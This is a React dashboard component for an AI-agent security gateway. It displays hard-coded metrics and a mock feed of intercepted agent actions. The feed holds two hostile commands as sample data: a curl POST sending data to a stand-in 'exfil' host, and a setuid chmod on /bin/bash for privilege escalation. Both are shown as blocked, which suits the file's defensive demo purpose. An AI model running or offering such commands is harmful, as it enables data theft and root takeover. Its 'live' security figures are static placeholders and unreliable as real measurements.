import React, { useState, useEffect } from 'react'
import { getBackendUrl, checkBackendHealth, fetchAuditLogs } from '../services/api'

export default function Dashboard({ backendOnline, setActiveTab }) {
  const [recentLogs, setRecentLogs] = useState([])

  useEffect(() => {
    fetchAuditLogs().then((logs) => {
      if (logs && logs.length > 0) {
        setRecentLogs(logs.slice(0, 3))
      }
    })
  }, [])

  const securityMetrics = [
    {
      label: 'Gateway Egress Compliance',
      val: '99.8%',
      trend: '+0.4%',
      note: 'Zero leakages detected across policy-enforced endpoints',
    },
    {
      label: 'Active Monitored Autonomous Agents',
      val: '312',
      trend: 'Live',
      note: 'Enforcing runtime sandboxing & proxy intercept',
    },
    {
      label: 'Interception Latency',
      val: '1.4ms',
      trend: 'Optimal',
      note: 'Sub-2ms overhead with zero-copy stream inspect',
    },
  ]

  const liveSecurityStream = [
    {
      id: 'EVT-904',
      time: 'Just now',
      agent: 'Financial Summarizer Bot',
      vector: 'Outbound HTTP Data Exfiltration',
      action: 'curl -X POST https://exfil.darkweb.io/drop',
      status: 'BLOCKED',
      statusColor: 'text-rose-400 bg-rose-500/10 border-rose-500/30',
      badge: 'FAIL-CLOSED TRIGGERED',
    },
    {
      id: 'EVT-903',
      time: '3m ago',
      agent: 'Code Review Copilot',
      vector: 'Privilege Escalation via Bash Subshell',
      action: 'sudo chmod +s /bin/bash',
      status: 'NEUTRALIZED',
      statusColor: 'text-amber-400 bg-amber-500/10 border-amber-500/30',
      badge: 'POLICY ENFORCED',
    },
    {
      id: 'EVT-902',
      time: '8m ago',
      agent: 'Document Vectorizer Agent',
      vector: 'Secure Read of Internal Architecture',
      action: 's3://internal-knowledge/q3-report.pdf',
      status: 'AUTHORIZED',
      statusColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/30',
      badge: 'WHITELISTED',
    },
  ]

  return (
    <div className="space-y-8 max-w-7xl mx-auto">
      
      {/* Top Banner: Status + Actions */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-2 border-b border-white/[0.08]">
        <div className="space-y-1">
          <div className="flex items-center gap-2.5">
            <span className="relative flex h-2.5 w-2.5">
              <span
                className={`animate-ping absolute inline-flex h-full w-full rounded-full ${
                  backendOnline ? 'bg-emerald-400' : 'bg-cyan-400'
                } opacity-75`}
              ></span>
              <span
                className={`relative inline-flex rounded-full h-2.5 w-2.5 ${
                  backendOnline ? 'bg-emerald-500' : 'bg-cyan-500'
                }`}
              ></span>
            </span>
            <span
              className={`text-xs font-mono uppercase tracking-widest font-semibold ${
                backendOnline ? 'text-emerald-400' : 'text-cyan-400'
              }`}
            >
              {backendOnline ? 'Gateway Connected (Live)' : 'Live Gateway Telemetry'}
            </span>
            <span className="text-slate-600 font-mono text-xs">•</span>
            <span className="text-xs font-mono text-slate-400">
              Host: <span className="text-slate-200">{getBackendUrl()}</span>
            </span>
          </div>
          <h2 className="text-2xl font-bold tracking-tight text-white font-sans">
            Security Overview & Threat Surface
          </h2>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={() => setActiveTab && setActiveTab('audit-logs')}
            className="px-4 py-2 text-xs font-mono text-slate-300 hover:text-white bg-white/[0.04] hover:bg-white/[0.08] border border-white/10 rounded-full transition cursor-pointer backdrop-blur-md"
          >
            View Audit Ledger →
          </button>
          <button
            onClick={() => setActiveTab && setActiveTab('agent-console')}
            className="px-5 py-2 text-xs font-semibold text-white bg-gradient-to-r from-violet-600 to-blue-600 hover:from-violet-500 hover:to-blue-500 rounded-full transition shadow-lg shadow-violet-600/30 cursor-pointer"
          >
            Launch Agent Console
          </button>
        </div>
      </div>

      {/* Bento Grid Layout */}
      <div className="grid grid-cols-1 md:grid-cols-12 gap-5">
        
        {/* Bento Cell 1: Hero Compliance Card (Span 8) */}
        <div className="md:col-span-8 glass-panel rounded-3xl p-7 relative overflow-hidden group hover:border-violet-500/40 transition-all duration-500">
          <div className="absolute top-0 right-0 w-72 h-72 bg-gradient-to-bl from-violet-600/20 via-blue-600/10 to-transparent rounded-full blur-3xl pointer-events-none group-hover:scale-125 transition-transform duration-700"></div>
          
          <div className="flex items-center justify-between relative z-10">
            <span className="text-[11px] font-mono uppercase tracking-wider text-slate-400">
              Deterministic Guardrail Status
            </span>
            <span className="text-[10px] font-mono px-3 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold">
              ZERO BYPASSES
            </span>
          </div>

          <div className="mt-6 flex flex-col md:flex-row md:items-end justify-between gap-6 relative z-10">
            <div>
              <div className="text-5xl md:text-6xl font-black text-white tracking-tight font-sans">
                100%
              </div>
              <p className="text-xs text-slate-400 mt-2 font-mono max-w-sm leading-relaxed">
                Interception mode enforced. Every tool-call proposal is evaluated against security policies prior to environment execution.
              </p>
            </div>

            <div className="space-y-2 shrink-0 font-mono text-xs">
              <div className="flex justify-between gap-4 text-slate-400">
                <span>Prompt Injection Filter:</span>
                <span className="text-cyan-400 font-semibold">Active (Regex + Heuristics)</span>
              </div>
              <div className="flex justify-between gap-4 text-slate-400">
                <span>Network Sandbox:</span>
                <span className="text-violet-400 font-semibold">Egress Isolated</span>
              </div>
              <div className="flex justify-between gap-4 text-slate-400">
                <span>Human Escalation Hook:</span>
                <span className="text-emerald-400 font-semibold">Active (/api/approvals)</span>
              </div>
            </div>
          </div>
        </div>

        {/* Bento Cell 2: Threat Matrix Mini Card (Span 4) */}
        <div className="md:col-span-4 glass-panel rounded-3xl p-7 flex flex-col justify-between relative overflow-hidden group hover:border-blue-500/40 transition-all duration-500">
          <div>
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-mono uppercase tracking-wider text-slate-400">
                Threat Surface Index
              </span>
              <span className="text-xs font-mono text-cyan-400">NOMINAL</span>
            </div>
            <div className="text-4xl font-extrabold text-white mt-4 font-sans">
              12 <span className="text-xs text-slate-500 font-mono font-normal">/ 100 Risk</span>
            </div>
            <p className="text-xs text-slate-400 mt-2 font-mono">
              All baseline anomalies quarantined. Automatic fail-closed threshold set at 65.
            </p>
          </div>

          <div className="mt-6 pt-4 border-t border-white/[0.08] flex items-center justify-between text-xs font-mono text-slate-400">
            <span>Interceptions today:</span>
            <span className="text-white font-bold">1,842 requests</span>
          </div>
        </div>

        {/* Bento Row 2: 3 Compact Spec Cards */}
        {securityMetrics.map((metric, i) => (
          <div
            key={i}
            className="md:col-span-4 glass-panel rounded-3xl p-6 relative overflow-hidden group hover:border-violet-500/40 transition-all duration-300"
          >
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-mono uppercase tracking-wider text-slate-400">
                {metric.label}
              </span>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-white/[0.06] text-cyan-300">
                {metric.trend}
              </span>
            </div>
            <div className="text-3xl font-extrabold text-white mt-3 font-sans">
              {metric.val}
            </div>
            <p className="text-[11px] text-slate-400 mt-2 font-mono leading-relaxed">
              {metric.note}
            </p>
          </div>
        ))}

        {/* Bento Row 3: Live Incident Log Stream (Span 12) */}
        <div className="md:col-span-12 glass-panel rounded-3xl p-7 space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-white/[0.08]">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-violet-400 animate-pulse"></span>
              <h3 className="text-xs font-bold tracking-widest uppercase font-mono text-white">
                Live Interception & Neutralization Feed
              </h3>
            </div>
            <span className="text-[10px] font-mono text-slate-400">Showing last events in buffer</span>
          </div>

          <div className="space-y-3">
            {liveSecurityStream.map((event) => (
              <div
                key={event.id}
                className="p-4 rounded-2xl bg-white/[0.02] border border-white/[0.05] hover:border-violet-500/30 transition-all flex flex-col md:flex-row md:items-center justify-between gap-4 group"
              >
                <div className="flex items-start md:items-center gap-4">
                  <div className="font-mono text-xs text-slate-500 pt-0.5 md:pt-0 shrink-0">
                    {event.time}
                  </div>
                  <div className="space-y-1">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="text-xs font-bold text-white group-hover:text-cyan-300 transition-colors font-sans">
                        {event.agent}
                      </span>
                      <span className="text-slate-600">•</span>
                      <span className="text-xs text-slate-300 font-mono">
                        {event.vector}
                      </span>
                    </div>
                    <div className="text-xs font-mono text-cyan-400/90 bg-black/40 px-3 py-1 rounded-lg border border-white/[0.04] inline-block">
                      {event.action}
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-3 self-end md:self-center shrink-0">
                  <span className={`text-[10px] font-mono font-bold px-3 py-1 rounded-full border ${event.statusColor}`}>
                    {event.status}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </div>

      </div>
    </div>
  )
}
